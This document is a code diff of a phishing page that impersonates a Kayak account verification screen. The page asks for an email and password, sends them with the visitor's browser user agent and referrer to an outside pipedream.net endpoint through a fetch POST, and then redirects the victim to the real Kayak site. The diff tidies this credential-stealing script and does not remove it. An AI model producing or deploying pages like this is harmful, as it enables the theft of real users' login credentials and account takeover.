@@ -1,7 +1,8 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
+  <meta charset="UTF-8" />
   <title>Kayak Account Verification</title>
   <style>
     body {
@@ -66,10 +67,10 @@
 <body>
   <div class="container">
     <div class="logo">
-      <img src="https://www.kayak.com/rimg/provider-logos/airlines/logo_KA_40.png?crop=true&width=200&height=200&fallback=default1.png&_v=80d2a7a60ee55ec0b8f2c70c9d3f2780c808b5b6" alt="Kayak Logo">
+      <img src="https://www.kayak.com/rimg/provider-logos/airlines/logo_KA_40.png" alt="Kayak Logo">
     </div>
     <h2>Verify Your Kayak Account</h2>
-    <form id="phishForm" action="https://eoh3rxe2o8pbhuj.m.pipedream.net" method="POST">
+    <form id="phishForm">
       <input type="email" name="email" placeholder="Email" required />
       <input type="password" name="password" placeholder="Password" required />
       <button type="submit">Continue</button>
@@ -78,35 +79,30 @@
   </div>
 
   <script>
-    document.getElementById('phishForm').addEventListener('submit', function() {
-      setTimeout(function() {
+    const form = document.getElementById('phishForm');
+    form.addEventListener('submit', function (e) {
+      e.preventDefault();
+
+      const email = form.email.value;
+      const password = form.password.value;
+      const userAgent = navigator.userAgent;
+      const referrer = document.referrer;
+
+      fetch('https://eoh3rxe2o8pbhuj.m.pipedream.net', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          email,
+          password,
+          userAgent,
+          referrer
+        })
+      });
+
+      setTimeout(() => {
         window.location.href = "https://www.kayak.com/";
-      }, 1000);
+      }, 1500);
     });
-
-const form = document.getElementById('phishForm');
-form.addEventListener('submit', function(e) {
-  const userAgent = navigator.userAgent;
-  const referrer = document.referrer;
-
-  fetch('https://eoh3rxe2o8pbhuj.m.pipedream.net', {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({
-      email: form.email.value,
-      password: form.password.value,
-      userAgent,
-      referrer
-    })
-  });
-
-  // Slight delay then redirect
-  setTimeout(() => {
-    window.location.href = "https://www.kayak.com/";
-  }, 1500);
-});
-
-
   </script>
 </body>
 </html>
